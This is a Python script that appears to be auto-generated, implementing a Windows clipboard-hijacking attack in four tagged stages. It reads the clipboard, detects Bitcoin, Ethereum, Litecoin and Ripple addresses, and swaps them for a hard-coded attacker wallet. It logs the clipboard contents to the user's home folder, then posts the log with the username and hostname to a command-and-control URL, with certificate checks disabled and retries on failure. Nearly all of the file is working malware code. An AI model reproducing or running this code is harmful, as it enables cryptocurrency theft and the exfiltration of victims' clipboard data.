#!/usr/bin/env python3
import sys
import json
import time
import re
import ctypes
import os
import socket
import requests
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        crypto_patterns = [
            r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
            r'^0x[a-fA-F0-9]{40}$',
            r'^L[a-zA-HJ-NP-Z0-9]{26,33}$',
            r'^[rX][a-zA-HJ-NP-Z0-9]{25,34}$'
        ]

        def get_clipboard_content() -> str:
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32

            user32.OpenClipboard(0)
            handle = user32.GetClipboardData(CF_TEXT)
            data = ctypes.c_char_p(handle).value
            user32.CloseClipboard()

            return data.decode('utf-8') if data else ''

        content = get_clipboard_content()
        is_crypto = any(re.match(pattern, content) for pattern in crypto_patterns)

        result = {
            'content': content,
            'is_crypto': is_crypto
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'content': '', 'is_crypto': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)

        attacker_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

        result = {
            "replaced": False,
            "original": content,
            "replacement": content
        }

        if is_crypto:
            result['replacement'] = attacker_address
            result['replaced'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    log_path = ''
    try:
        content = input_data.get('content', '')
        is_crypto = input_data.get('is_crypto', False)

        user_home = os.path.expanduser("~")
        log_file_name = "clipboard_log.txt"
        log_path = os.path.join(user_home, log_file_name)

        with open(log_path, 'a') as log_file:
            log_file.write(f"Crypto: {is_crypto}, Content: {content}\n")

        result = {'log_path': log_path}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'log_path': log_path},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        log_path = input_data.get('log_path', '')

        with open(log_path, 'r') as log_file:
            log_content = log_file.read()

        payload = {
            'username': os.getlogin(),
            'hostname': socket.gethostname(),
            'log_content': log_content
        }

        c2_url = "https://192.168.79.141/api"

        success = False
        for attempt in range(3):
            try:
                response = requests.post(c2_url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    success = True
                    break
            except (requests.ConnectionError, requests.Timeout):
                time.sleep(5)

        result = {'success': success}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Monitor Clipboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Monitor Clipboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Monitor Clipboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Replace Crypto Address [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Replace Crypto Address): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Replace Crypto Address): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Log Clipboard Content [data-processing] ──
    try:
        r = task_T3(outputs.get('T1', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Log Clipboard Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Log Clipboard Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Exfiltrate Logs [exfiltration] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Exfiltrate Logs): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Exfiltrate Logs): FAILED — {err}')
            failed.append('T4')
            r2 = task_T4(outputs.get('T3', {}))
            if r2.get('success'):
                outputs['T4'] = r2.get('data', {})
                failed.remove('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))